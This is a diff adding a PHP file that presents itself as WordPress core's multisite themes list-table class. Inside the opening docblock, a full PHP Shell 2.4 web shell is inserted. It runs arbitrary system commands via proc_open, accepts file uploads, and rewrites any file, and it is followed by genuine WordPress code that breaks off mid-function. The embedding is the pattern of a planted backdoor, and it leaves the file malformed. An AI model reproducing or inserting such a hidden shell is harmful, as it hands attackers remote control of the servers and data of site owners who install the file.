@@ -1,0 +1,1629 @@
+<?php
+/**
+ * List Table API: WP_MS_Themes_List_Table class
+ *
+ * @package WordPress
+ * @subpackage Administration
+ * @since 3.1.0
+ */
+
+/**
+<?php // -*- coding: utf-8 -*-
+
+define('PHPSHELL_VERSION', '2.4');
+/*
+
+  **************************************************************
+  *                     PHP Shell                              *
+  **************************************************************
+
+  PHP Shell is an interactive PHP script that will execute any command
+  entered.  See the files README, INSTALL, and SECURITY or
+  http://phpshell.sourceforge.net/ for further information.
+
+  Copyright (C) 2000-2012 the Phpshell-team
+
+  This program is free software; you can redistribute it and/or
+  modify it under the terms of the GNU General Public License
+  as published by the Free Software Foundation; either version 2
+  of the License, or (at your option) any later version.
+
+  This program is distributed in the hope that it will be useful,
+  but WITHOUT ANY WARRANTY; without even the implied warranty of
+  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+  GNU General Public License for more details.
+
+  You can get a copy of the GNU General Public License from this
+  address: http://www.gnu.org/copyleft/gpl.html#SEC1
+  You can also write to the Free Software Foundation, Inc., 59 Temple
+  Place - Suite 330, Boston, MA  02111-1307, USA.
+  
+*/
+
+/* There are no user-configurable settings in this file anymore, please see
+ * config.php instead. */
+
+header("Content-Type: text/html; charset=utf-8");
+
+/* This error handler will turn all notices, warnings, and errors into fatal
+ * errors, unless they have been suppressed with the @-operator. */
+function error_handler($errno, $errstr, $errfile, $errline, $errcontext)
+{
+    /* The @-operator (used with chdir() below) temporarely makes
+     * error_reporting() return zero, and we don't want to die in that case.
+     * We do note the error in the output, though. */
+    if (error_reporting() == 0) {
+        $_SESSION['output'] .= $errstr . "\n";
+    } else {
+        die('<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
+   "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+  <title>PHP Shell ' . PHPSHELL_VERSION . '</title>
+  <meta http-equiv="Content-Script-Type" content="text/javascript">
+  <meta http-equiv="Content-Style-Type" content="text/css">
+  <meta name="generator" content="phpshell">
+  <link rel="shortcut icon" type="image/x-icon" href="phpshell.ico">
+  <link rel="stylesheet" href="style.css" type="text/css">
+</head>
+<body>
+  <h1>Fatal Error!</h1>
+  <p><b>' . $errstr . '</b></p>
+  <p>in <b>' . $errfile . '</b>, line <b>' . $errline . '</b>.</p>
+
+  <hr>
+
+  <p>Please consult the <a href="README">README</a>, <a
+  href="INSTALL">INSTALL</a>, and <a href="SECURITY">SECURITY</a> files for
+  instruction on how to use PHP Shell.</p>
+
+  <hr>
+
+  <address>
+  Copyright &copy; 2000&ndash;2012, the Phpshell-team. Get the latest
+  version at <a
+  href="http://phpshell.sourceforge.net/">http://phpshell.sourceforge.net/</a>.
+  </address>
+
+</body>
+</html>');
+    }
+}
+
+/* Installing our error handler makes PHP die on even the slightest problem.
+ * This is what we want in a security critical application like this. */
+set_error_handler('error_handler');
+
+
+function logout()
+{
+    /* Empty the session data, except for the 'authenticated' entry which the
+     * rest of the code needs to be able to check. */
+    $_SESSION = array('authenticated' => false);
+
+    /* Unset the client's cookie, if it has one. */
+    //    if (isset($_COOKIE[session_name()]))
+    //        setcookie(session_name(), '', time()-42000, '/');
+
+    /* Destroy the session data on the server.  This prevents the simple
+     * replay attack where one uses the back button to re-authenticate using
+     * the old POST data since the server wont know the session then. */
+    //    session_destroy();
+}
+
+/* Clear screen */
+function clearscreen() 
+{
+    $_SESSION['output'] = '';
+}
+
+function stripslashes_deep($value)
+{
+    if (is_array($value)) {
+        return array_map('stripslashes_deep', $value);
+    } else {
+        return stripslashes($value);
+    }
+}
+
+if (get_magic_quotes_gpc()) {
+    $_POST = stripslashes_deep($_POST);
+}
+
+/* Initialize some variables we need again and again. */
+$username = isset($_POST['username']) ? $_POST['username'] : '';
+$password = isset($_POST['password']) ? $_POST['password'] : '';
+$nounce   = isset($_POST['nounce'])   ? $_POST['nounce']   : '';
+
+$command  = isset($_POST['command'])  ? $_POST['command']  : '';
+$rows     = isset($_POST['rows'])     ? $_POST['rows']     : 24;
+$columns  = isset($_POST['columns'])  ? $_POST['columns']  : 80;
+
+if (!preg_match('/^[[:digit:]]+$/', $rows)) { 
+    $rows=24 ; 
+} 
+if (!preg_match('/^[[:digit:]]+$/', $columns)) {
+    $columns=80 ;
+}
+/* Load the configuration. */
+$ini = parse_ini_file('config.php', true);
+
+if (empty($ini['settings'])) {
+    $ini['settings'] = array();
+}
+
+/* Default settings --- these settings should always be set to something. */
+$default_settings = array('home-directory' => '.',
+                          'PS1'            => '$ ');
+$showeditor = false;
+
+/* Merge settings. */
+$ini['settings'] = array_merge($default_settings, $ini['settings']);
+
+session_start();
+
+/* Delete the session data if the user requested a logout. This leaves
+ * the session cookie at the user, but this is not important since we
+ * authenticates on $_SESSION['authenticated']. */
+if (isset($_POST['logout'])) {
+    logout();
+}
+
+/* Clear screen if submitted */
+if (isset($_POST['clear'])) {
+    clearscreen();
+}
+
+/* Attempt authentication. */
+if (isset($_SESSION['nounce']) && $nounce == $_SESSION['nounce'] 
+    && isset($ini['users'][$username])
+) {
+    if (strchr($ini['users'][$username], ':') === false) {
+        // No seperator found, assume this is a password in clear text.
+        $_SESSION['authenticated'] = ($ini['users'][$username] == $password);
+    } else {
+        list($fkt, $salt, $hash) = explode(':', $ini['users'][$username]);
+        $_SESSION['authenticated'] = ($fkt($salt . $password) == $hash);
+    }
+}
+
+
+/* Enforce default non-authenticated state if the above code didn't set it
+ * already. */
+if (!isset($_SESSION['authenticated'])) {
+    $_SESSION['authenticated'] = false;
+}
+
+if ($_SESSION['authenticated']) {  
+    /* Initialize the session variables. */
+    if (empty($_SESSION['cwd'])) {
+        $_SESSION['cwd'] = realpath($ini['settings']['home-directory']);
+        $_SESSION['history'] = array();
+        $_SESSION['output'] = '';
+    }
+    /* Clicked on one of the subdirectory links - ignore the command */
+    if (isset($_POST['levelup'])) {
+        $levelup = $_POST['levelup'] ;
+        while ($levelup > 0) {
+            $command = '' ; /* ignore the command */
+            $_SESSION['cwd'] = dirname($_SESSION['cwd']);
+            $levelup -- ;
+        }
+    }
+    /* Selected a new subdirectory as working directory - ignore the command */
+    if (isset($_POST['changedirectory'])) {
+        $changedir= $_POST['changedirectory'];
+        if (strlen($changedir) > 0) {
+            if (@chdir($_SESSION['cwd'] . '/' . $changedir)) {
+                $command = '' ; /* ignore the command */
+                $_SESSION['cwd'] = realpath($_SESSION['cwd'] . '/' . $changedir);
+            }
+        }
+    }
+    if (isset($_FILES['uploadfile']['tmp_name'])) {
+        if (is_uploaded_file($_FILES['uploadfile']['tmp_name'])) {
+            if (!move_uploaded_file($_FILES['uploadfile']['tmp_name'], $_SESSION['cwd'] . '/' . $_FILES['uploadfile']['name'])) { 
+                echo "CANNOT MOVE {$_FILES['uploadfile']['name']}" ;
+            }
+        }
+    }
+
+    /* Save content from 'editor' */
+    if (isset($_POST["filetoedit"]) && ($_POST["filetoedit"] != "")) {
+        $filetoedit_handle = fopen($_POST["filetoedit"], "w");
+        fputs($filetoedit_handle, str_replace("%0D%0D%0A", "%0D%0A", $_POST["filecontent"]));
+        fclose($filetoedit_handle);
+    }
+
+    if (!empty($command)) {
+        /* Save the command for late use in the JavaScript. If the command is
+         * already in the history, then the old entry is removed before the
+         * new entry is put into the list at the front. */
+        if (($i = array_search($command, $_SESSION['history'])) !== false) {
+            unset($_SESSION['history'][$i]);
+        }
+
+        array_unshift($_SESSION['history'], $command);
+  
+        /* Now append the command to the output. */
+        $_SESSION['output'] .= htmlspecialchars($ini['settings']['PS1'] . $command, ENT_COMPAT, 'UTF-8') . "\n";
+
+        /* Initialize the current working directory. */
+        if (trim($command) == 'cd') {
+            $_SESSION['cwd'] = realpath($ini['settings']['home-directory']);
+        } elseif (preg_match('/^[[:blank:]]*cd[[:blank:]]+([^;]+)$/', $command, $regs)) {
+            /* The current command is a 'cd' command which we have to handle
+             * as an internal shell command. */
+
+            /* if the directory starts and ends with quotes ("), remove them -
+               allows command like 'cd "abc def"' */
+            if ((substr($regs[1], 0, 1) == '"') && (substr($regs[1], -1) =='"') ) {
+                $regs[1] = substr($regs[1], 1);
+                $regs[1] = substr($regs[1], 0, -1);
+            }
+
+            if ($regs[1]{0} == '/') {
+                /* Absolute path, we use it unchanged. */
+                $new_dir = $regs[1];
+            } else {
+                /* Relative path, we append it to the current working directory. */
+                $new_dir = $_SESSION['cwd'] . '/' . $regs[1];
+            }
+
+            /* Transform '/./' into '/' */
+            while (strpos($new_dir, '/./') !== false) {
+                $new_dir = str_replace('/./', '/', $new_dir);
+            }
+
+            /* Transform '//' into '/' */
+            while (strpos($new_dir, '//') !== false) {
+                $new_dir = str_replace('//', '/', $new_dir);
+            }
+
+            /* Transform 'x/..' into '' */
+            while (preg_match('|/\.\.(?!\.)|', $new_dir)) {
+                $new_dir = preg_replace('|/?[^/]+/\.\.(?!\.)|', '', $new_dir);
+            }
+
+            if ($new_dir == '') {
+                $new_dir = '/';
+            }
+
+            /* Try to change directory. */
+            if (@chdir($new_dir)) {
+                $_SESSION['cwd'] = $new_dir;
+            } else {
+                $_SESSION['output'] .= "cd: could not change to: $new_dir\n";
+            }
+
+            /* history command (without parameter) - output the command history */
+        } elseif (trim($command) == 'history') {
+            $i = 1 ; 
+            foreach ($_SESSION['history'] as $histline) {
+                $_SESSION['output'] .= htmlspecialchars(sprintf("%5d  %s\n", $i, $histline), ENT_COMPAT, 'UTF-8');
+                $i++;
+            }
+            /* history command (with parameter "-c") - clear the command history */
+        } elseif (preg_match('/^[[:blank:]]*history[[:blank:]]*-c[[:blank:]]*$/', $command)) {
+            $_SESSION['history'] = array() ;
+            /* "clear" command - clear the screen */
+        } elseif (trim($command) == 'clear') {
+            clearscreen();
+        } elseif (trim($command) == 'editor') {
+            /* You called 'editor' without a filename so you get an short help
+             * on how to use the internal 'editor' command */
+               $_SESSION['output'] .= " Syntax: editor filename\n (you forgot the filename)\n";
+        
+        } elseif (preg_match('/^[[:blank:]]*editor[[:blank:]]+([^;]+)$/', $command, $regs)) {
+            /* This is a tiny editor which you can start with 'editor filename'. */
+            $filetoedit = $regs[1];
+            if ($regs[1]{0} != '/') {
+                /* relative path, add it to the current working directory. */
+                $filetoedit = $_SESSION['cwd'].'/'.$regs[1];
+            } ;
+            if (is_file(realpath($filetoedit)) || ! file_exists($filetoedit)) {
+                $showeditor = true;
+                if (file_exists(realpath($filetoedit))) {
+                    $filetoedit = realpath($filetoedit);
+                }
+            } else {
+                $_SESSION['output'] .= " Syntax: editor filename\n (just regular or not existing files)\n";
+            }
+
+        } elseif ((trim($command) == 'exit') || (trim($command) == 'logout')) {
+            logout();
+        } else {
+
+            /* The command is not an internal command, so we execute it after
+             * changing the directory and save the output. */
+            if (@chdir($_SESSION['cwd'])) {
+
+                // We canot use putenv() in safe mode.
+                if (!ini_get('safe_mode')) {
+                    // Advice programs (ls for example) of the terminal size.
+                    putenv('ROWS=' . $rows);
+                    putenv('COLUMNS=' . $columns);
+                }
+
+                /* Alias expansion. */
+                $length = strcspn($command, " \t");
+                $token = substr($command, 0, $length);
+                if (isset($ini['aliases'][$token])) {
+                    $command = $ini['aliases'][$token] . substr($command, $length);
+                }
+                $io = array();
+                $p = proc_open(
+                    $command,
+                    array(1 => array('pipe', 'w'),
+                          2 => array('pipe', 'w')),
+                    $io
+                );
+
+                /* Read output sent to stdout. */
+                while (!feof($io[1])) {
+                    $line=fgets($io[1]);
+                    if (function_exists('mb_convert_encoding')) {
+                        /* (hopefully) fixes a strange "htmlspecialchars(): Invalid multibyte sequence in argument" error */
+                        $line = mb_convert_encoding($line, 'UTF-8', 'UTF-8');
+                    }
+                    $_SESSION['output'] .= htmlspecialchars($line, ENT_COMPAT, 'UTF-8');
+                }
+                /* Read output sent to stderr. */
+                while (!feof($io[2])) {
+                    $line=fgets($io[2]);
+                    if (function_exists('mb_convert_encoding')) {
+                        /* (hopefully) fixes a strange "htmlspecialchars(): Invalid multibyte sequence in argument" error */
+                        $line = mb_convert_encoding($line, 'UTF-8', 'UTF-8');
+                    }
+                    $_SESSION['output'] .= htmlspecialchars($line, ENT_COMPAT, 'UTF-8');
+                }
+            
+                fclose($io[1]);
+                fclose($io[2]);
+                proc_close($p);
+            } else { /* It was not possible to change to working directory. Do not execute the command */
+                $_SESSION['output'] .= "PHP Shell could not change to working directory. Your command was not executed.\n";
+            }
+        }
+    }
+
+    /* Build the command history for use in the JavaScript */
+    if (empty($_SESSION['history'])) {
+        $js_command_hist = '""';
+    } else {
+        $escaped = array_map('addslashes', $_SESSION['history']);
+        $js_command_hist = '"", "' . implode('", "', $escaped) . '"';
+    }
+}
+
+?>
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
+   "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+  <title>PHP Shell <?php echo PHPSHELL_VERSION ?></title>
+  <meta http-equiv="Content-Script-Type" content="text/javascript">
+  <meta http-equiv="Content-Style-Type" content="text/css">
+  <meta name="generator" content="phpshell">
+  <link rel="shortcut icon" type="image/x-icon" href="phpshell.ico">
+  <link rel="stylesheet" href="style.css" type="text/css">
+
+  <script type="text/javascript">
+  <?php if ($_SESSION['authenticated'] && ! $showeditor) { ?>
+
+    var current_line = 0;
+    var command_hist = new Array(<?php echo $js_command_hist ?>);
+    var last = 0;
+
+    function key(e) {
+        if (!e) var e = window.event;
+
+        if (e.keyCode == 38 && current_line < command_hist.length-1) {
+            command_hist[current_line] = document.shell.command.value;
+            current_line++;
+            document.shell.command.value = command_hist[current_line];
+        }
+
+        if (e.keyCode == 40 && current_line > 0) {
+            command_hist[current_line] = document.shell.command.value;
+            current_line--;
+            document.shell.command.value = command_hist[current_line];
+        }
+
+    }
+
+    function init() {
+        document.shell.setAttribute("autocomplete", "off");
+        document.shell.output.scrollTop = document.shell.output.scrollHeight;
+        document.shell.command.focus()
+    }
+
+  <?php } elseif ($_SESSION['authenticated'] && $showeditor) { ?>
+
+    function init() {
+      document.shell.filecontent.focus();
+    }
+
+  <?php } else { ?>
+
+    function init() {
+        document.shell.username.focus();
+    }
+
+  <?php } ?>
+    function levelup(d) {
+        document.shell.levelup.value=d ; 
+        document.shell.submit() ;
+    }
+    function changesubdir(d) {
+        document.shell.changedirectory.value=document.shell.dirselected.value ; 
+        document.shell.submit() ;
+    }
+  </script>
+</head>
+
+<body onload="init()">
+
+<h1>PHP Shell <?php echo PHPSHELL_VERSION ?></h1>
+
+<form name="shell" enctype="multipart/form-data" action="<?php print($_SERVER['PHP_SELF']) ?>" method="post">
+<div><input name="levelup" id="levelup" type="hidden"></div>
+<div><input name="changedirectory" id="changedirectory" type="hidden"></div>
+<?php
+if (!$_SESSION['authenticated']) {
+    /* Generate a new nounce every time we present the login page.  This binds
+     * each login to a unique hit on the server and prevents the simple replay
+     * attack where one uses the back button in the browser to replay the POST
+     * data from a login. */
+    $_SESSION['nounce'] = mt_rand();
+
+
+    if (ini_get('safe_mode') && $ini['settings']['safe-mode-warning'] == true ) {
+        echo '<div class="warning">Warning: Safe-mode is enabled. PHP Shell will probably not work correctly.</div>';
+    }
+
+
+?>
+
+<fieldset>
+    <legend>Authentication</legend>
+    <?php
+    if (!empty($username)) {
+        echo "  <p class=\"error\">Login failed, please try again:</p>\n";
+    } else {
+        echo "  <p>Please login:</p>\n";
+    }
+    ?>
+
+  <label for="username">Username:</label>
+  <input name="username" id="username" type="text" value="<?php echo $username ?>"><br>
+  <label for="password">Password:</label>
+  <input name="password" id="password" type="password">
+  <p><input type="submit" value="Login"></p>
+  <input name="nounce" type="hidden" value="<?php echo $_SESSION['nounce']; ?>">
+
+</fieldset>
+
+<?php } else { /* Authenticated. */ ?>
+<fieldset>
+  <legend><?php echo "Phpshell running on: " . $_SERVER['SERVER_NAME']; ?></legend>
+<p>Current Working Directory:
+<span class="pwd"><?php
+    if ( $showeditor ) {
+        echo htmlspecialchars($_SESSION['cwd'], ENT_COMPAT, 'UTF-8') . '</span>';
+    } else { /* normal mode - offer navigation via hyperlinks */
+        $parts = explode('/', $_SESSION['cwd']);
+     
+        for ($i=1; $i<count($parts); $i=$i+1) {
+            echo '<a class="pwd" title="Change to this directory. Your command will not be executed." href="javascript:levelup(' . (count($parts)-$i) . ')">/</a>' ;
+            echo htmlspecialchars($parts[$i], ENT_COMPAT, 'UTF-8');
+        }
+        echo '</span>';
+        if (is_readable($_SESSION['cwd'])) { /* is the current directory readable? */
+            /* Now we make a list of the directories. */
+            $dir_handle = opendir($_SESSION['cwd']);
+            /* We store the output so that we can sort it later: */
+            $options = array();
+            /* Run through all the files and directories to find the dirs. */
+            while ($dir = readdir($dir_handle)) {
+                if (($dir != '.') and ($dir != '..') and is_dir($_SESSION['cwd'] . "/" . $dir)) {
+                    $options[$dir] = "<option value=\"/$dir\">$dir</option>";
+                }
+            }
+            closedir($dir_handle);
+            if (count($options)>0) {
+                ksort($options);
+                echo '<br><a href="javascript:changesubdir()">Change to subdirectory</a>: <select name="dirselected">';
+                echo implode("\n", $options);
+                echo '</select>';
+            }
+        } else {
+            echo "[current directory not readable]";
+        }  
+    }
+?>
+<br>
+
+    <?php if (! $showeditor) { /* Outputs the 'terminal' without the editor */ ?>
+
+<div id="terminal">
+<textarea name="output" readonly="readonly" cols="<?php echo $columns ?>" rows="<?php echo $rows ?>">
+<?php
+        $lines = substr_count($_SESSION['output'], "\n");
+        $padding = str_repeat("\n", max(0, $rows+1 - $lines));
+        echo rtrim($padding . $_SESSION['output']);
+?>
+</textarea>
+<p id="prompt">
+<span id="ps1"><?php echo htmlspecialchars($ini['settings']['PS1'], ENT_COMPAT, 'UTF-8'); ?></span>
+<input name="command" type="text" onkeyup="key(event)"
+       size="<?php echo $columns-strlen($ini['settings']['PS1']); ?>" tabindex="1">
+</p>
+</div>
+
+    <?php } else { /* Output the 'editor' */ ?>
+    <?php print("You are editing this file: ".$filetoedit); ?>
+
+<div id="terminal">
+<textarea name="filecontent" cols="<?php echo $columns ?>" rows="<?php echo $rows ?>">
+<?php
+    if (file_exists($filetoedit)) {
+         print(htmlspecialchars(str_replace("%0D%0D%0A", "%0D%0A", file_get_contents($filetoedit))));		 
+    }
+?>
+</textarea>
+</div>
+
+<?php } /* End of terminal */ ?>
+
+<p>
+<?php if (! $showeditor) { /* You can not resize the textarea while
+                           * the editor is 'running', because if you would
+                           * do so you would lose the changes you have
+                           * already made in the textarea since last saving */
+?>
+  <span style="float: right">Size: <input type="text" name="rows" size="2"
+  maxlength="3" value="<?php echo $rows ?>"> &times; <input type="text"
+  name="columns" size="2" maxlength="3" value="<?php echo $columns
+  ?>"></span><br>
+<input type="submit" value="Execute command">
+<input type="submit" name="clear" value="Clear screen">
+<?php } else { /* for 'editor-mode' */ ?>
+<input type="hidden" name="filetoedit" id="filetoedit" value="<?php print($filetoedit) ?>">
+<input type="submit" value="Save and Exit">
+<input type="reset" value="Undo all Changes">
+<input type="submit" value="Exit without saving" onclick="javascript:document.getElementById('filetoedit').value='';return true;">
+<?php } ?>
+
+  <input type="submit" name="logout" value="Logout">
+</p>
+</fieldset>
+
+<?php if ($ini['settings']['file-upload']) { ?>
+<br><br>
+<fieldset>
+  <legend>File upload</legend>
+    Select file for upload:
+    <input type="file" name="uploadfile" size="40"><br>
+<input type="submit" value="Upload file">
+</fieldset>
+    <?php } ?>
+
+<?php } ?>
+
+</form>
+
+<hr>
+
+<p>Please consult the <a href="README">README</a>, <a
+href="INSTALL">INSTALL</a>, and <a href="SECURITY">SECURITY</a> files for
+instruction on how to use PHP Shell.</p>
+<p>If you have not created accounts for phpshell, please use 
+<a href="pwhash.php">pwhash.php</a> to create secure passwords.</p>
+
+<hr>
+<address>
+Copyright &copy; 2000&ndash;2012, the Phpshell-team. Get the
+latest version at <a
+href="http://phpshell.sourceforge.net/">http://phpshell.sourceforge.net/</a>.
+</address>
+</body>
+</html>
+ * Core class used to implement displaying themes in a list table for the network admin.
+ *
+ * @since 3.1.0
+ * @access private
+ *
+ * @see WP_List_Table
+ */
+class WP_MS_Themes_List_Table extends WP_List_Table {
+
+	public $site_id;
+	public $is_site_themes;
+
+	private $has_items;
+
+	/**
+	 * Whether to show the auto-updates UI.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @var bool True if auto-updates UI is to be shown, false otherwise.
+	 */
+	protected $show_autoupdates = true;
+
+	/**
+	 * Constructor.
+	 *
+	 * @since 3.1.0
+	 *
+	 * @see WP_List_Table::__construct() for more information on default arguments.
+	 *
+	 * @global string $status
+	 * @global int    $page
+	 *
+	 * @param array $args An associative array of arguments.
+	 */
+	public function __construct( $args = array() ) {
+		global $status, $page;
+
+		parent::__construct(
+			array(
+				'plural' => 'themes',
+				'screen' => isset( $args['screen'] ) ? $args['screen'] : null,
+			)
+		);
+
+		$status = isset( $_REQUEST['theme_status'] ) ? $_REQUEST['theme_status'] : 'all';
+		if ( ! in_array( $status, array( 'all', 'enabled', 'disabled', 'upgrade', 'search', 'broken', 'auto-update-enabled', 'auto-update-disabled' ), true ) ) {
+			$status = 'all';
+		}
+
+		$page = $this->get_pagenum();
+
+		$this->is_site_themes = ( 'site-themes-network' === $this->screen->id ) ? true : false;
+
+		if ( $this->is_site_themes ) {
+			$this->site_id = isset( $_REQUEST['id'] ) ? (int) $_REQUEST['id'] : 0;
+		}
+
+		$this->show_autoupdates = wp_is_auto_update_enabled_for_type( 'theme' ) &&
+			! $this->is_site_themes && current_user_can( 'update_themes' );
+	}
+
+	/**
+	 * @return array
+	 */
+	protected function get_table_classes() {
+		// @todo Remove and add CSS for .themes.
+		return array( 'widefat', 'plugins' );
+	}
+
+	/**
+	 * @return bool
+	 */
+	public function ajax_user_can() {
+		if ( $this->is_site_themes ) {
+			return current_user_can( 'manage_sites' );
+		} else {
+			return current_user_can( 'manage_network_themes' );
+		}
+	}
+
+	/**
+	 * @global string $status
+	 * @global array $totals
+	 * @global int $page
+	 * @global string $orderby
+	 * @global string $order
+	 * @global string $s
+	 */
+	public function prepare_items() {
+		global $status, $totals, $page, $orderby, $order, $s;
+
+		wp_reset_vars( array( 'orderby', 'order', 's' ) );
+
+		$themes = array(
+			/**
+			 * Filters the full array of WP_Theme objects to list in the Multisite
+			 * themes list table.
+			 *
+			 * @since 3.1.0
+			 *
+			 * @param WP_Theme[] $all Array of WP_Theme objects to display in the list table.
+			 */
+			'all'      => apply_filters( 'all_themes', wp_get_themes() ),
+			'search'   => array(),
+			'enabled'  => array(),
+			'disabled' => array(),
+			'upgrade'  => array(),
+			'broken'   => $this->is_site_themes ? array() : wp_get_themes( array( 'errors' => true ) ),
+		);
+
+		if ( $this->show_autoupdates ) {
+			$auto_updates = (array) get_site_option( 'auto_update_themes', array() );
+
+			$themes['auto-update-enabled']  = array();
+			$themes['auto-update-disabled'] = array();
+		}
+
+		if ( $this->is_site_themes ) {
+			$themes_per_page = $this->get_items_per_page( 'site_themes_network_per_page' );
+			$allowed_where   = 'site';
+		} else {
+			$themes_per_page = $this->get_items_per_page( 'themes_network_per_page' );
+			$allowed_where   = 'network';
+		}
+
+		$current      = get_site_transient( 'update_themes' );
+		$maybe_update = current_user_can( 'update_themes' ) && ! $this->is_site_themes && $current;
+
+		foreach ( (array) $themes['all'] as $key => $theme ) {
+			if ( $this->is_site_themes && $theme->is_allowed( 'network' ) ) {
+				unset( $themes['all'][ $key ] );
+				continue;
+			}
+
+			if ( $maybe_update && isset( $current->response[ $key ] ) ) {
+				$themes['all'][ $key ]->update = true;
+				$themes['upgrade'][ $key ]     = $themes['all'][ $key ];
+			}
+
+			$filter                    = $theme->is_allowed( $allowed_where, $this->site_id ) ? 'enabled' : 'disabled';
+			$themes[ $filter ][ $key ] = $themes['all'][ $key ];
+
+			$theme_data = array(
+				'update_supported' => isset( $theme->update_supported ) ? $theme->update_supported : true,
+			);
+
+			// Extra info if known. array_merge() ensures $theme_data has precedence if keys collide.
+			if ( isset( $current->response[ $key ] ) ) {
+				$theme_data = array_merge( (array) $current->response[ $key ], $theme_data );
+			} elseif ( isset( $current->no_update[ $key ] ) ) {
+				$theme_data = array_merge( (array) $current->no_update[ $key ], $theme_data );
+			} else {
+				$theme_data['update_supported'] = false;
+			}
+
+			$theme->update_supported = $theme_data['update_supported'];
+
+			/*
+			 * Create the expected payload for the auto_update_theme filter, this is the same data
+			 * as contained within $updates or $no_updates but used when the Theme is not known.
+			 */
+			$filter_payload = array(
+				'theme'        => $key,
+				'new_version'  => '',
+				'url'          => '',
+				'package'      => '',
+				'requires'     => '',
+				'requires_php' => '',
+			);
+
+			$filter_payload = (object) array_merge( $filter_payload, array_intersect_key( $theme_data, $filter_payload ) );
+
+			$auto_update_forced = wp_is_auto_update_forced_for_item( 'theme', null, $filter_payload );
+
+			if ( ! is_null( $auto_update_forced ) ) {
+				$theme->auto_update_forced = $auto_update_forced;
+			}
+
+			if ( $this->show_autoupdates ) {
+				$enabled = in_array( $key, $auto_updates, true ) && $theme->update_supported;
+				if ( isset( $theme->auto_update_forced ) ) {
+					$enabled = (bool) $theme->auto_update_forced;
+				}
+
+				if ( $enabled ) {
+					$themes['auto-update-enabled'][ $key ] = $theme;
+				} else {
+					$themes['auto-update-disabled'][ $key ] = $theme;
+				}
+			}
+		}
+
+		if ( $s ) {
+			$status           = 'search';
+			$themes['search'] = array_filter( array_merge( $themes['all'], $themes['broken'] ), array( $this, '_search_callback' ) );
+		}
+
+		$totals    = array();
+		$js_themes = array();
+		foreach ( $themes as $type => $list ) {
+			$totals[ $type ]    = count( $list );
+			$js_themes[ $type ] = array_keys( $list );
+		}
+
+		if ( empty( $themes[ $status ] ) && ! in_array( $status, array( 'all', 'search' ), true ) ) {
+			$status = 'all';
+		}
+
+		$this->items = $themes[ $status ];
+		WP_Theme::sort_by_name( $this->items );
+
+		$this->has_items = ! empty( $themes['all'] );
+		$total_this_page = $totals[ $status ];
+
+		wp_localize_script(
+			'updates',
+			'_wpUpdatesItemCounts',
+			array(
+				'themes' => $js_themes,
+				'totals' => wp_get_update_data(),
+			)
+		);
+
+		if ( $orderby ) {
+			$orderby = ucfirst( $orderby );
+			$order   = strtoupper( $order );
+
+			if ( 'Name' === $orderby ) {
+				if ( 'ASC' === $order ) {
+					$this->items = array_reverse( $this->items );
+				}
+			} else {
+				uasort( $this->items, array( $this, '_order_callback' ) );
+			}
+		}
+
+		$start = ( $page - 1 ) * $themes_per_page;
+
+		if ( $total_this_page > $themes_per_page ) {
+			$this->items = array_slice( $this->items, $start, $themes_per_page, true );
+		}
+
+		$this->set_pagination_args(
+			array(
+				'total_items' => $total_this_page,
+				'per_page'    => $themes_per_page,
+			)
+		);
+	}
+
+	/**
+	 * @param WP_Theme $theme
+	 * @return bool
+	 */
+	public function _search_callback( $theme ) {
+		static $term = null;
+		if ( is_null( $term ) ) {
+			$term = wp_unslash( $_REQUEST['s'] );
+		}
+
+		foreach ( array( 'Name', 'Description', 'Author', 'Author', 'AuthorURI' ) as $field ) {
+			// Don't mark up; Do translate.
+			if ( false !== stripos( $theme->display( $field, false, true ), $term ) ) {
+				return true;
+			}
+		}
+
+		if ( false !== stripos( $theme->get_stylesheet(), $term ) ) {
+			return true;
+		}
+
+		if ( false !== stripos( $theme->get_template(), $term ) ) {
+			return true;
+		}
+
+		return false;
+	}
+
+	// Not used by any core columns.
+	/**
+	 * @global string $orderby
+	 * @global string $order
+	 * @param array $theme_a
+	 * @param array $theme_b
+	 * @return int
+	 */
+	public function _order_callback( $theme_a, $theme_b ) {
+		global $orderby, $order;
+
+		$a = $theme_a[ $orderby ];
+		$b = $theme_b[ $orderby ];
+
+		if ( $a === $b ) {
+			return 0;
+		}
+
+		if ( 'DESC' === $order ) {
+			return ( $a < $b ) ? 1 : -1;
+		} else {
+			return ( $a < $b ) ? -1 : 1;
+		}
+	}
+
+	/**
+	 */
+	public function no_items() {
+		if ( $this->has_items ) {
+			_e( 'No themes found.' );
+		} else {
+			_e( 'No themes are currently available.' );
+		}
+	}
+
+	/**
+	 * @return array
+	 */
+	public function get_columns() {
+		$columns = array(
+			'cb'          => '<input type="checkbox" />',
+			'name'        => __( 'Theme' ),
+			'description' => __( 'Description' ),
+		);
+
+		if ( $this->show_autoupdates ) {
+			$columns['auto-updates'] = __( 'Automatic Updates' );
+		}
+
+		return $columns;
+	}
+
+	/**
+	 * @return array
+	 */
+	protected function get_sortable_columns() {
+		return array(
+			'name' => 'name',
+		);
+	}
+
+	/**
+	 * Gets the name of the primary column.
+	 *
+	 * @since 4.3.0
+	 *
+	 * @return string Unalterable name of the primary column name, in this case, 'name'.
+	 */
+	protected function get_primary_column_name() {
+		return 'name';
+	}
+
+	/**
+	 * @global array $totals
+	 * @global string $status
+	 * @return array
+	 */
+	protected function get_views() {
+		global $totals, $status;
+
+		$status_links = array();
+		foreach ( $totals as $type => $count ) {
+			if ( ! $count ) {
+				continue;
+			}
+
+			switch ( $type ) {
+				case 'all':
+					/* translators: %s: Number of themes. */
+					$text = _nx(
+						'All <span class="count">(%s)</span>',
+						'All <span class="count">(%s)</span>',
+						$count,
+						'themes'
+					);
+					break;
+				case 'enabled':
+					/* translators: %s: Number of themes. */
+					$text = _nx(
+						'Enabled <span class="count">(%s)</span>',
+						'Enabled <span class="count">(%s)</span>',
+						$count,
+						'themes'
+					);
+					break;
+				case 'disabled':
+					/* translators: %s: Number of themes. */
+					$text = _nx(
+						'Disabled <span class="count">(%s)</span>',
+						'Disabled <span class="count">(%s)</span>',
+						$count,
+						'themes'
+					);
+					break;
+				case 'upgrade':
+					/* translators: %s: Number of themes. */
+					$text = _nx(
+						'Update Available <span class="count">(%s)</span>',
+						'Update Available <span class="count">(%s)</span>',
+						$count,
+						'themes'
+					);
+					break;
+				case 'broken':
+					/* translators: %s: Number of themes. */
+					$text = _nx(
